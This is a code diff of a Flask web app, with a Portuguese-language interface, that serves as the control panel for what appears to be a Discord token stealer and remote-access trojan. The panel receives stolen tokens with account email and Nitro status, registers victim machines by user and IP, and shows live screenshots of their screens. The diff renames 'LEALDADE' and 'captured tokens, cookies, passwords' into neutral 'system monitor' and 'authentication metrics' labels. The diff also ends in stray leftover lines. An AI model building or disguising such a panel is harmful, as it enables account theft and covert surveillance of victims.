@@ -39,319 +39,476 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>LEALDADE SYSTEM MONITOR</title>
+    <title>System Monitor Dashboard</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0f0f23;
-            color: #e0e0e0;
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
             min-height: 100vh;
-        }
-        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
-        .header { text-align: center; margin-bottom: 40px; }
-        .header h1 { 
-            font-size: 3em; 
-            margin-bottom: 10px; 
-            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-weight: 700;
-        }
-        .header p { color: #9ca3af; font-size: 1.1rem; }
-        
-        .stats-grid { 
-            display: grid; 
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
-            gap: 25px; 
-            margin-bottom: 50px;
-        }
-        .stat-card { 
-            background: linear-gradient(135deg, rgba(124, 58, 237, 0.1) 0%, rgba(168, 85, 247, 0.1) 100%);
-            border: 1px solid rgba(124, 58, 237, 0.2);
-            border-radius: 16px; 
-            padding: 25px; 
-            text-align: center;
-            backdrop-filter: blur(10px);
-            transition: transform 0.3s ease;
-        }
-        .stat-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.2);
-        }
-        .stat-value { 
-            font-size: 2.5em; 
-            font-weight: 700; 
-            color: #a855f7;
-            margin-bottom: 5px;
-        }
-        .stat-label { color: #9ca3af; font-size: 0.9rem; text-transform: uppercase; letter-spacing: 1px; }
-        
-        .tabs-container { 
-            display: flex; 
-            margin-bottom: 30px;
-            background: rgba(17, 17, 27, 0.6);
-            border-radius: 12px;
-            padding: 5px;
-        }
-        .tab { 
-            background: transparent; 
-            color: #9ca3af; 
-            border: none; 
-            padding: 15px 25px; 
-            cursor: pointer;
-            border-radius: 8px;
-            font-size: 0.95rem;
-            transition: all 0.3s ease;
-            flex: 1;
-        }
-        .tab.active { 
-            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
-            color: white;
-            box-shadow: 0 4px 15px rgba(124, 58, 237, 0.3);
-        }
-        .tab:hover:not(.active) { background: rgba(124, 58, 237, 0.1); }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-        
-        .cards-grid { 
-            display: grid; 
-            grid-template-columns: repeat(auto-fit, minmax(350px, 1fr)); 
-            gap: 25px; 
-        }
-        .card { 
-            background: linear-gradient(135deg, rgba(17, 17, 27, 0.8) 0%, rgba(31, 31, 46, 0.8) 100%);
-            border: 1px solid rgba(124, 58, 237, 0.1);
-            border-radius: 16px; 
-            padding: 25px;
-            backdrop-filter: blur(10px);
-            transition: transform 0.3s ease;
-        }
-        .card:hover { transform: translateY(-3px); }
-        .card h3 { 
-            color: #a855f7; 
-            margin-bottom: 20px; 
-            font-size: 1.3rem;
-            padding-bottom: 10px;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
-        }
-        .card p { margin: 8px 0; color: #e0e0e0; }
-        .card strong { color: #a855f7; }
-        
-        .refresh-btn {
-            position: fixed;
-            bottom: 30px;
-            right: 30px;
-            background: linear-gradient(135deg, #7c3aed 0%, #a855f7 100%);
-            color: white;
-            border: none;
-            width: 60px;
-            height: 60px;
-            border-radius: 50%;
-            cursor: pointer;
-            font-size: 24px;
-            box-shadow: 0 4px 20px rgba(124, 58, 237, 0.3);
-            transition: transform 0.3s ease;
-        }
-        .refresh-btn:hover { transform: scale(1.1); }
-        
-        .data-section {
-            background: rgba(10, 10, 15, 0.6);
-            border: 1px solid rgba(124, 58, 237, 0.2);
-            border-radius: 12px;
+            color: #fff;
             padding: 20px;
+        }
+        h1 {
+            text-align: center;
+            color: #00d4ff;
+            text-shadow: 0 0 20px rgba(0,212,255,0.5);
+            margin-bottom: 20px;
+            font-size: 2.5em;
+        }
+        .server-info {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            padding: 10px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+        }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-bottom: 30px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .stat-box {
+            background: rgba(255,255,255,0.05);
+            border-radius: 15px;
+            padding: 25px;
+            text-align: center;
+            border: 1px solid rgba(0,212,255,0.3);
+        }
+        .stat-number {
+            font-size: 3em;
+            font-weight: bold;
+            color: #00d4ff;
+        }
+        .stat-label {
+            color: #888;
+            margin-top: 10px;
+        }
+        .tabs {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 30px;
+        }
+        .tab {
+            background: rgba(255,255,255,0.1);
+            border: none;
+            color: #fff;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1em;
+        }
+        .tab.active {
+            background: #00d4ff;
+            color: #000;
+            font-weight: bold;
+        }
+        .tab-content {
+            display: none;
+        }
+        .tab-content.active {
+            display: block;
+        }
+        .section {
+            background: rgba(255,255,255,0.03);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        .section h2 {
+            color: #00d4ff;
             margin-bottom: 20px;
         }
-        .data-section h3 {
-            color: #a855f7;
-            font-size: 1.1rem;
+        .client-card {
+            background: rgba(0,0,0,0.3);
+            border-radius: 10px;
+            padding: 20px;
             margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid rgba(124, 58, 237, 0.2);
+            border-left: 4px solid #00d4ff;
         }
-        .token-card, .cookie-card, .password-card {
-            background: rgba(168, 85, 247, 0.1);
-            border: 1px solid rgba(168, 85, 247, 0.2);
+        .client-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        .client-name {
+            font-weight: bold;
+            font-size: 1.2em;
+        }
+        .status {
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.85em;
+            font-weight: bold;
+        }
+        .status.online { background: #00d26a; color: #000; }
+        .client-info {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 10px;
+            font-size: 0.9em;
+            color: #aaa;
+        }
+        .token-card {
+            background: rgba(0,0,0,0.4);
             border-radius: 8px;
-            padding: 12px;
-            margin: 8px 0;
-            font-family: 'Courier New', monospace;
-            font-size: 0.8rem;
+            padding: 15px;
+            margin-bottom: 10px;
+            font-family: monospace;
+            border-left: 3px solid #ffd700;
             word-break: break-all;
         }
-        .screenshot-img {
-            max-width: 100%;
-            border-radius: 12px;
-            border: 2px solid rgba(124, 58, 237, 0.3);
+        .token-valid {
+            border-left-color: #00d26a;
         }
-        .empty-state {
+        .screen-container {
+            background: rgba(0,0,0,0.5);
+            border-radius: 15px;
+            padding: 20px;
             text-align: center;
+        }
+        .live-badge {
+            background: #ff0000;
+            color: white;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            animation: pulse 2s infinite;
+            display: inline-block;
+            margin-bottom: 15px;
+        }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .screen-img {
+            max-width: 100%;
+            max-height: 70vh;
+            border-radius: 10px;
+            border: 2px solid #00d4ff;
+        }
+        .client-select {
+            margin-bottom: 20px;
+            padding: 10px;
+            background: rgba(255,255,255,0.1);
+            border: 1px solid #00d4ff;
+            color: #fff;
+            border-radius: 5px;
+            font-size: 1em;
+        }
+        .empty {
+            text-align: center;
+            color: #666;
             padding: 40px;
-            color: #6b7280;
+        }
+        .refresh-btn {
+            background: linear-gradient(135deg, #00d4ff, #0099cc);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 1em;
+            display: block;
+            margin: 0 auto 30px;
+        }
+        .update-time {
+            text-align: center;
+            color: #666;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <h1>LEALDADE SYSTEM MONITOR</h1>
-            <p>Painel de Monitoramento em Tempo Real</p>
+    <h1>🔱 System Monitor Dashboard</h1>
+    
+    <div class="server-info">
+        🌐 Sistema Online | 📡 Monitoramento Remoto de Endpoints
+    </div>
+    
+    <div class="update-time">
+        <button class="refresh-btn" onclick="location.reload()">🔄 Atualizar</button>
+        <div>Última atualização: <span id="updateTime">{{UPDATE_TIME}}</span></div>
+    </div>
+    
+    <div class="stats">
+        <div class="stat-box">
+            <div class="stat-number" id="totalEndpoints">0</div>
+            <div class="stat-label">Endpoints</div>
         </div>
-
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-value" id="totalEndpoints">0</div>
-                <div class="stat-label">Endpoints</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="onlineEndpoints">0</div>
-                <div class="stat-label">Online</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="totalMetrics">0</div>
-                <div class="stat-label">Métricas</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value" id="totalScreenshots">0</div>
-                <div class="stat-label">Screenshots</div>
-            </div>
+        <div class="stat-box">
+            <div class="stat-number" id="onlineEndpoints">0</div>
+            <div class="stat-label">Online</div>
         </div>
-
-        <div class="tabs-container">
-            <button class="tab active" onclick="showTab('endpoints')">Endpoints</button>
-            <button class="tab" onclick="showTab('screenshot')">Screenshot</button>
-            <button class="tab" onclick="showTab('data')">Dados</button>
+        <div class="stat-box">
+            <div class="stat-number" id="totalMetrics">0</div>
+            <div class="stat-label">Métricas</div>
         </div>
-        
-        <div id="endpoints" class="tab-content active">
-            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Endpoints Monitorados</h2>
-            <div class="cards-grid" id="endpointsList">
-                <div style="color: #6b7280; text-align: center; padding: 40px;">Carregando...</div>
-            </div>
-        </div>
-
-        <div id="screenshot" class="tab-content">
-            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Screenshot Manual</h2>
-            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
-                <select id="endpointSelect" style="width: 100%; max-width: 400px; padding: 14px; background: rgba(10, 10, 15, 0.8); border: 1px solid rgba(124, 58, 237, 0.3); border-radius: 12px; color: #e0e0e0; font-size: 0.95rem; margin-bottom: 20px;" onchange="selectEndpoint()">
-                    <option value="">Selecione um endpoint...</option>
-                </select>
-                <button id="screenshotBtn" style="background: linear-gradient(135deg, #22c55e 0%, #16a34a 100%); color: white; border: none; padding: 12px 24px; border-radius: 8px; cursor: pointer; font-size: 0.9rem; font-weight: 500; margin-bottom: 20px;" onclick="requestScreenshot()" disabled>📸 Capturar Screenshot</button>
-                <div id="screenContent" style="background: rgba(10, 10, 15, 0.9); border-radius: 16px; padding: 20px; text-align: center; min-height: 400px; display: flex; flex-direction: column; align-items: center; justify-content: center;">
-                    <div style="color: #6b7280;">Selecione um endpoint</div>
-                </div>
+    </div>
+    
+    <div class="tabs">
+        <button class="tab active" onclick="showTab('endpoints')">🖥️ Endpoints</button>
+        <button class="tab" onclick="showTab('metrics')">📊 Métricas</button>
+        <button class="tab" onclick="showTab('remote')">📺 Acesso Remoto</button>
+    </div>
+    
+    <div id="endpoints" class="tab-content active">
+        <div class="section">
+            <h2>🖥️ Endpoints Monitorados</h2>
+            <div id="endpointsList">
+                <div class="empty">Carregando...</div>
             </div>
         </div>
-        
-        <div id="data" class="tab-content">
-            <h2 style="color: #f3f4f6; margin-bottom: 24px; padding-left: 12px; border-left: 3px solid #a855f7;">Menu de Dados</h2>
-            <div style="background: rgba(17, 17, 27, 0.6); border-radius: 16px; padding: 24px;">
-                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px;">
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('tokens')">🔑 Tokens</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('cookies')">🍪 Cookies</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('passwords')">🔒 Senhas</button>
-                    <button class="tab" style="padding: 20px; background: rgba(124, 58, 237, 0.1); border: 1px solid rgba(124, 58, 237, 0.2);" onclick="showDataCategory('files')">📁 Arquivos</button>
-                </div>
-                
-                <div id="dataContent" style="min-height: 400px;">
-                    <div style="text-align: center; padding: 40px; color: #6b7280;">Selecione uma categoria acima</div>
+    </div>
+    
+    <div id="metrics" class="tab-content">
+        <div class="section">
+            <h2>📊 Métricas de Autenticação</h2>
+            <div id="metricsList">
+                <div class="empty">Carregando...</div>
+            </div>
+        </div>
+    </div>
+    
+    <div id="remote" class="tab-content">
+        <div class="section">
+            <h2>📺 Visualização Remota</h2>
+            <select id="endpointSelect" class="client-select" onchange="loadScreen()">
+                <option value="">Selecione um endpoint...</option>
+            </select>
+            <div class="screen-container">
+                <div class="live-badge">● LIVE</div>
+                <div id="screenContent">
+                    <div class="empty">Selecione um endpoint para visualizar</div>
                 </div>
             </div>
         </div>
     </div>
-
-    <button class="refresh-btn" onclick="loadAllData()">🔄</button>
-
+    
     <script>
-        let currentEndpoint = null;
-        let currentCategory = null;
-
+        // Carrega dados iniciais
+        loadStats();
+        loadEndpoints();
+        loadMetrics();
+        document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
+        
+        // Atualiza a cada 5 segundos
+        setInterval(() => {
+            loadStats();
+            loadEndpoints();
+            loadMetrics();
+            loadScreen();
+            document.getElementById('updateTime').textContent = new Date().toLocaleTimeString();
+        }, 5000);
+        
         function showTab(tabName) {
-            document.querySelectorAll('.tab-content').forEach(content => {
-                content.classList.remove('active');
-            });
-            document.querySelectorAll('.tab').forEach(tab => {
-                tab.classList.remove('active');
-            });
-            
-            document.getElementById(tabName).classList.add('active');
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
             event.target.classList.add('active');
+            document.getElementById(tabName).classList.add('active');
         }
-
-        function showDataCategory(category) {
-            currentCategory = category;
-            const contentDiv = document.getElementById('dataContent');
-            
-            switch(category) {
-                case 'tokens':
-                    loadTokens();
-                    break;
-                case 'cookies':
-                    loadCookies();
-                    break;
-                case 'passwords':
-                    loadPasswords();
-                    break;
-                case 'files':
-                    loadFiles();
-                    break;
-            }
+        
+        async function loadStats() {
+            try {
+                const res = await fetch('/api/stats');
+                const data = await res.json();
+                document.getElementById('totalEndpoints').textContent = data.total_endpoints || 0;
+                document.getElementById('onlineEndpoints').textContent = data.online_endpoints || 0;
+                document.getElementById('totalMetrics').textContent = data.total_metrics || 0;
+            } catch(e) {}
         }
-
+        
         async function loadEndpoints() {
             try {
-                const response = await fetch('/api/endpoints');
-                const endpoints = await response.json();
-                
+                const res = await fetch('/api/endpoints');
+                const endpoints = await res.json();
                 const container = document.getElementById('endpointsList');
-                container.innerHTML = '';
-                
-                Object.values(endpoints).forEach(endpoint => {
-                    const div = document.createElement('div');
-                    div.className = 'card';
-                    div.innerHTML = `
-                        <h3>${endpoint.hostname}</h3>
-                        <p><strong>ID:</strong> ${endpoint.id}</p>
-                        <p><strong>Usuário:</strong> ${endpoint.user}</p>
-                        <p><strong>IP Local:</strong> ${endpoint.ip_address}</p>
-                        <p><strong>IP Externo:</strong> ${endpoint.external_ip}</p>
-                        <p><strong>Plataforma:</strong> ${endpoint.platform}</p>
-                        <p><strong>RAM:</strong> ${endpoint.ram}</p>
-                        <p><strong>Status:</strong> 🟢 Online</p>
-                        <p><strong>Visto:</strong> ${endpoint.last_seen}</p>
-                        <button class="tab" style="margin-top: 15px; padding: 8px 16px;" onclick="requestScreenshot('${endpoint.id}')">📸 Screenshot</button>
-                    `;
-                    container.appendChild(div);
-                });
-                
-                document.getElementById('totalEndpoints').textContent = Object.keys(endpoints).length;
-                document.getElementById('onlineEndpoints').textContent = Object.keys(endpoints).length;
-                
-                // Atualiza o select de endpoints
                 const select = document.getElementById('endpointSelect');
-                select.innerHTML = '<option value="">Selecione um endpoint...</option>';
-                Object.keys(endpoints).forEach(id => {
-                    const option = document.createElement('option');
-                    option.value = id;
-                    option.textContent = `${endpoints[id].hostname} (${id})`;
-                    select.appendChild(option);
-                });
-            } catch (error) {
-                console.error('Error loading endpoints:', error);
-            }
+                
+                if (endpoints.length === 0) {
+                    container.innerHTML = '<div class="empty">Nenhum endpoint conectado</div>';
+                    return;
+                }
+                
+                let selectHtml = '<option value="">Selecione um endpoint...</option>';
+                
+                container.innerHTML = endpoints.map(e => {
+                    selectHtml += `<option value="${e.id}">${e.hostname} (${e.user})</option>`;
+                    return `
+                    <div class="client-card">
+                        <div class="client-header">
+                            <span class="client-name">${e.hostname}</span>
+                            <span class="status ${e.status}">${e.status.toUpperCase()}</span>
+                        </div>
+                        <div class="client-info">
+                            <div>👤 ${e.user}</div>
+                            <div>🌐 ${e.ip_address}</div>
+                            <div>🌍 ${e.external_ip}</div>
+                            <div>💻 ${e.platform}</div>
+                            <div>💾 ${e.ram}</div>
+                            <div>⏰ ${e.last_seen}</div>
+                        </div>
+                    </div>
+                    `;
+                }).join('');
+                
+                select.innerHTML = selectHtml;
+            } catch(e) {}
         }
-
-        async function loadTokens() {
+        
+        async function loadMetrics() {
             try {
-                const response = await fetch('/api/tokens_data');
-                const tokens = await response.json();
+                const res = await fetch('/api/metrics');
+                const metrics = await res.json();
+                const container = document.getElementById('metricsList');
                 
-                const contentDiv = document.getElementById('dataContent');
-                contentDiv.innerHTML = '<div class="data-section"><h3>🔑 Tokens Capturados</h3><div id="tokensList"></div></div>';
+                if (metrics.length === 0) {
+                    container.innerHTML = '<div class="empty">Nenhuma métrica recebida</div>';
+                    return;
+                }
                 
-                const tokensList = document.getElementById('tokensList');
-                tokensList.innerHTML = '';
+                container.innerHTML = metrics.map(m => {
+                    const acc = m.account || {};
+                    const accInfo = acc.username 
+                        ? `✅ ${acc.username}#${acc.discriminator || '0000'} ${acc.email ? '| 📧 ' + acc.email : ''} ${acc.premium_type ? '| 💎 Nitro' : ''}`
+                        : '❌ Inválido';
+                    return `
+                    <div class="token-card ${m.valid ? 'token-valid' : ''}">
+                        <div style="color:#ffd700; margin-bottom:5px">${m.token}</div>
+                        <div style="color:#888; font-size:0.8em">🖥️ ${m.endpoint_id} | 📍 ${m.source}</div>
+                        <div style="color:#00d26a; margin-top:5px">${accInfo}</div>
+                    </div>
+                    `;
+                }).join('');
+            } catch(e) {}
+        }
+        
+        async function loadScreen() {
+            const endpointId = document.getElementById('endpointSelect').value;
+            if (!endpointId) return;
+            
+            try {
+                const res = await fetch(`/api/screenshot/${endpointId}`);
+                const data = await res.json();
                 
+                if (data.image) {
+                    document.getElementById('screenContent').innerHTML = 
+                        `<img class="screen-img" src="data:image/png;base64,${data.image}" alt="Visualização remota">`;
+                }
+            } catch(e) {}
+        }
+    </script>
+</body>
+</html>
+"""
+
+# API Endpoints robustos
+@app.route('/')
+def index():
+    """Página de login (principal)"""
+    return LOGIN_TEMPLATE
+
+@app.route('/dashboard')
+def dashboard():
+    """Página principal do dashboard"""
+    return HTML_TEMPLATE.replace('{{UPDATE_TIME}}', datetime.now().strftime('%H:%M:%S'))
+
+@app.route('/api/register', methods=['POST'])
+def register_endpoint():
+    """Registra novo endpoint"""
+    try:
+        data = request.get_json()
+        endpoint_id = data.get('id')
+        
+        if not endpoint_id:
+            return jsonify({'error': 'ID é obrigatório'}), 400
+        
+        endpoints[endpoint_id] = {
+            'id': endpoint_id,
+            'hostname': data.get('hostname', 'Unknown'),
+            'user': data.get('user', 'Unknown'),
+            'ip_address': data.get('ip_address', '0.0.0.0'),
+            'external_ip': data.get('external_ip', '0.0.0.0'),
+            'platform': data.get('platform', 'Unknown'),
+            'ram': data.get('ram', 'Unknown'),
+            'status': 'online',
+            'last_seen': datetime.now().strftime('%H:%M:%S')
+        }
+        
+        return jsonify({'success': True, 'message': 'Endpoint registrado'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/endpoints', methods=['GET'])
+def get_endpoints():
+    """Lista todos os endpoints"""
+    return jsonify(list(endpoints.values()))
+
+@app.route('/api/stats', methods=['GET'])
+def get_stats():
+    """Estatísticas gerais"""
+    return jsonify({
+        'total_endpoints': len(endpoints),
+        'online_endpoints': len([e for e in endpoints.values() if e['status'] == 'online']),
+        'total_metrics': len(metrics_data)
+    })
+
+@app.route('/api/metrics', methods=['POST'])
+def receive_metrics():
+    """Recebe métricas de autenticação"""
+    try:
+        data = request.get_json()
+        metrics_data.append({
+            'endpoint_id': data.get('endpoint_id'),
+            'token': data.get('token'),
+            'valid': data.get('valid', False),
+            'account': data.get('account', {}),
+            'source': data.get('source', 'unknown'),
+            'timestamp': datetime.now().isoformat()
+        })
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/metrics', methods=['GET'])
+def get_metrics():
+    """Lista todas as métricas"""
+    return jsonify(metrics_data)
+
+@app.route('/api/screenshot/<endpoint_id>', methods=['GET'])
+def get_screenshot(endpoint_id):
+    """Obtém screenshot de um endpoint"""
+    if endpoint_id in endpoint_screenshots:
+        return jsonify(endpoint_screenshots[endpoint_id])
+    return jsonify({'error': 'Screenshot não encontrado'}), 404
+
+@app.route('/api/screenshot', methods=['POST'])
+def upload_screenshot():
+    """Recebe screenshot de um endpoint"""
+    try:
+        data = request.get_json()
+        endpoint_id = data.get('endpoint_id')
+        image_data = data.get('image')
+        
+        if endpoint_id and image_data:
+            endpoint_screenshots[endpoint_id] = {
+                'image': image_data,
+                'timestamp': datetime.now().isoformat()
+            }
+        return jsonify({'success': True})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 5000))
+    app.run(host='0.0.0.0', port=port, debug=False)
                 Object.entries(tokens).forEach(([endpoint_id, data]) => {
                     data.tokens.forEach(token => {
                         const div = document.createElement('div');
